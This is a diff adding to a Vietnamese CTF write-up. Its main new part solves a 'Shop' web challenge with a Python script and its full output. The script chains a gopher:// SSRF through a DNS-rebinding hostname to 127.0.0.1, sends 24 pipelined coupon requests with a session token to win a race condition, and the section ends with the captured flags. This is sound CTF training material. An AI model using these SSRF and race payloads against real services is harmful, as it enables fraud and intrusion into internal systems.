@@ -3220,6 +3220,9 @@ def plant_payload(target, payload, username, password):
 
 \- ID sinh bởi `secrets.token_hex(16)` → 32 ký tự hex → đúng 30 trigram trượt. Mỗi trigram abc là một cạnh có hướng ab → bc (hai trigram liên tiếp chồng nhau 2 ký tự)
 
+- ID dài 32 ký tự nên có 32 − 3 + 1 = 30 cửa sổ trigram liên tiếp
+- Đây là số vị trí mà một trigram có thể lặp, nên số trigram duy nhất có thể ít hơn 30
+
 \- Ghép ID bằng cách tìm đường Euler dùng mỗi cạnh đúng một lần; trong lần chạy ở ảnh, đường đi từ cặp đầu (s=d6) tới cặp cuối (e=3f).
 
 \- Solver kiểm tra điều kiện tồn tại đường Euler (bậc vào/ra của từng đỉnh) trước, rồi duyệt trail. 2 hàm `degree_ok()` và `euler_candidates()`
@@ -3658,3 +3661,94 @@ $\implies$ user_id được leak ra: `d680695a4383fbde39c1b876dda3933f`
 
 > KMA{1_2_3_ta_cung_lao_vao_trong_dong_doi}
 
+# Shop
+
+![alt text](images/image-46.png)
+
+## Exploit
+
+1.  Thông qua `/register`, tạo một tài khoản với thông tin `meo:meo`
+
+2. Tại giao diện dòng lệnh, đăng nhập với `meo:meo` và lưu vào $SESSION
+
+![alt text](images/image-49.png)
+
+3. Tạo script khai thác Race condition
+
+<details>
+    <summary>make_race.py</summary>
+
+```
+import json
+import os
+import urllib.parse
+
+
+session = os.environ.get("SESSION")
+if not session:
+    raise SystemExit("SESSION chưa được export. Đăng nhập meo:meo rồi export SESSION trước.")
+
+host = "make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms"
+user_agent = (
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+)
+
+requests = []
+for i in range(24):
+    connection = "close" if i == 23 else "keep-alive"
+    requests.append(
+        "POST /order/1/apply HTTP/1.1\r\n"
+        "Host: x\r\n"
+        f"User-Agent: {user_agent}\r\n"
+        f"Cookie: session={session}\r\n"
+        "Content-Type: application/x-www-form-urlencoded\r\n"
+        "Content-Length: 13\r\n"
+        f"Connection: {connection}\r\n\r\n"
+        "coupon=KMACTF"
+    )
+
+gopher_url = (
+    f"gopher://{host}:3000/_"
+    + urllib.parse.quote_from_bytes("".join(requests).encode(), safe="")
+)
+
+with open("race.json", "w", encoding="utf-8") as payload_file:
+    json.dump({"callbackUrl": gopher_url}, payload_file)
+
+print("Đã tạo race.json với 24 request pipelined.")
+print(f"User-Agent: {user_agent}")
+```
+
+</details>
+
+\- Nó đọc JWT từ biến môi trường SESSION, dựng 24 request `POST /order/1/apply` (lấy dư) để áp coupon KMACTF, rồi ghép chúng thành một chuỗi HTTP pipelining.
+
+\- Chuỗi này được URL-encode thành gopher URL trỏ tới hostname dùng DNS rebinding, sau đó ghi
+  vào race.json dưới dạng JSON với trường callbackUrl.
+
+4. Chạy script và gửi output `race.json` vào webhook
+
+<details>
+    <summary>race.json</summary>
+
+```
+{"callbackUrl": "gopher://make-1-1-1-1-rebind-127-0-0-1-rr.1u.ms:3000/_POST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20keep-alive%0D%0A%0D%0Acoupon%3DKMACTFPOST%20%2Forder%2F1%2Fapply%20HTTP%2F1.1%0D%0AHost%3A%20x%0D%0AUser-Agent%3A%20Mozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Safari%2F537.36%0D%0ACookie%3A%20session%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoibWVvIiwiaXNMb2dpbiI6dHJ1ZSwiaWF0IjoxNzkwNzg2NzYzfQ.zcQ4A7CmF4OPZsnmFU_nhR8Bo2Hn3jj8JNEHTS2sQXg%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0AConnection%3A%20close%0D%0A%0D%0Acoupon%3DKMACTF"}
+```
+
+</details>
+
+![alt text](images/image-50.png)
+
+\- Response trả về `{"ok":true,...}` 
+
+&rarr; Thành công race condition, giảm giá FLAG xuống 0 đồng
+
+5. Truy cập `/order/1` và mua FLAG
+
+
+![alt text](images/image-47.png)
+
+![alt text](images/image-48.png)
+
+> KMACTF{a2f86cfd17815978b5808130462db76c6dcbbd1976cbceffeeef8ef552787b90}
